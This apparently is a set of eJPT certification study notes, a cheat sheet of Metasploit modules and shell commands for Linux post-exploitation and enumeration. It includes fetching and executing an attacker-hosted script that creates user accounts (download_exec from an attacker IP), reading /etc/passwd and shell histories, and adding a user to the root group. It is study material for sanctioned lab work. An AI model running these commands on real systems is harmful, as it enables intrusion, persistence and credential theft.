[[Root 𖣂]] | [[eJPT - Cheat Sheets]] | [[eJPT - README]]

<hr>

# Metasploit Modules

```shell
post/linux/gather/enum_configs
# Gathers configuration files from the target Linux system that may contain sensitive information.

post/multi/gather/env
# Collects environment variables from the target session, which may include credentials, paths, and system configuration.

post/linux/gather/enum_network
# Enumerates detailed network configuration, interfaces, routes, and DNS settings on the target Linux machine.

post/linux/gather/enum_protections
# Identifies security mechanisms in place on the target Linux system, such as SELinux, AppArmor, and hardening configs.

post/linux/gather/enum_system
# Collects general system information including OS version, kernel details, and system architecture.

post/linux/gather/checkcontainer 
# Detects if the current session is running inside a containerized environment like Docker or LXC.

post/linux/gather/checkvm
# Checks if the target system is running inside a virtual machine (e.g., VMware, VirtualBox, QEMU).

post/linux/gather/enum_users_history
# Extracts user shell histories (like .bash_history) to uncover commands previously executed by users.

use post/multi/manage/system_session
# This module is used to elevate a Meterpreter session to SYSTEM-level privileges, if possible, on the target machine.
set SESSION 1
set TYPE python
set HANDLER true
set LHOST <local_IP>
run

# OTHER
# Now, let’s create a bash file which will create a user on the target machine by uploading a test.sh file and execute it.
# test.sh file
useradd hacker
useradd test
useradd nick

# Run the Apache server on the attacker’s machine and copy the test.sh file in the root folder.
/etc/init.d/apache2 start
cp test.sh /var/www/html

use post/linux/manage/download_exec
set URL http://192.216.221.2/test.sh
set SESSION 1
run

# Let’s verify it by interacting with the session.
sessions -i 1
cat /etc/passwd
```

<br>

# Enumeration with LinEnum

```shell
# You will need to copy the content of the script in raw format and paste it into a text file
# We can now navigate back to our meterpreter session and navigate to the tmp drive by running the following command
cd /tmp
upload /root/Desktop/LinEnum.sh
shell
/bin/bash -i
chmod +x LinEnum.sh
./LinEnum.sh
```

<br>

# System Info

```shell
# Enumerate the Linux distribution and the OS architecture
sysinfo

# We can enumerate the hostname of the system by spawning a shell session
hostname

# We can also identify the Linux distro name and release version manually
cat /etc/issue
cat /etc/*release

# Version of the Linux kernel
uname -a
uname -r

# Identify hardware information regarding the CPU being used on the target system
lscpu

# List of storage devices attached to the Linux system
df -h

# Enumerate environment variable for a specific user, useful for privilege escalation part
env
# The PATH=/usr/local/sbin: .... The PATH environement specifies the directory that is used by default whenever you type a command or rather for binaries. 

# Installed software or packages
dpkg -l

# Checking the shells available on the system
cat /etc/shells

# Check the permissions each shell has
cat /etc/shells | while read shell; do ls -l $shell 2>/dev/null; done
# Loops through all valid shell paths listed in /etc/shells and displays their permissions if they exist.
# Useful for checking which shells are present and executable on the system.
# We can use any shell with the permission lrwxrwxrwx for escalation.
```

<br>

# Users and Groups

```shell
# Enumerate the current user
getuid

# We can also obtain the same information manually
whoami

# We can enumerate the groups that the root user is a part of
groups <user>

# List of other user and service accounts
cat /etc/passwd
# This command displays all user accounts on a Linux system except those that are not allowed to log in
cat /etc/passwd | grep -v /nologin

cat /etc/group
# Displays the contents of the /etc/group file, which stores group account information in Linux

# Add bob to root group
usermod -aG root bob
groups bob

# We can view the users that are currently logged in
who -w
last
lastlog
```

<br>

# Network Information

```shell
# Check network interfaces on the target system
ifconfig
ip a # Alternative to ifconfig, shows detailed info for each interface

# Check current active connections (e.g., Meterpreter reverse shell on port 4433)
netstat

# View the routing table for the target
route

# Basic system network info
cat /etc/networks # Network names
cat /etc/hostname # Hostname of the machine
cat /etc/hosts # Local hostname-to-IP mapping
cat /etc/resolv.conf # DNS server configuration

# List ARP table to see devices the target has communicated with (may not be installed)
arp -a
# Use Meterpreter's ARP command to list the ARP cache from the target
arp # Shows IP-to-MAC mappings of known network hosts
```

<br>

# Process & Services

```shell
# List of running processes on the target system
ps

# We can also find the PID of a specific service
pgrep vsftpd

# We can enumerate the list of cron jobs on the Kali Linux system
crontab -l 
ls -al /etc/cron*
cat /etc/cron*
```

